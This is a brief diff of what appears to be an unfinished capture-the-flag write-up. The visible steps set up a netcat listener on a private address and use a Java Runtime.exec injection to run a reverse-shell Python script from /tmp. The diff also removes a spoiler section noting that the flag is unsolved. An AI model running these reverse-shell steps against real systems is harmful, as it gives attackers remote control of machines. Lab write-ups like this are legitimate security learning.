@@ -16,10 +16,3 @@ Still working on it... just dropping commands
 8. *Setup Netcat listener*
    ```nc -l 10.40.3.230```
 9. ```print new java.lang.Runtime().exec("python3 /tmp/reverse.py")```
-
-<details>
-  <summary>SPOILER: Flag</summary>
-
-  ```Haven't Solved```
-  
-</details>
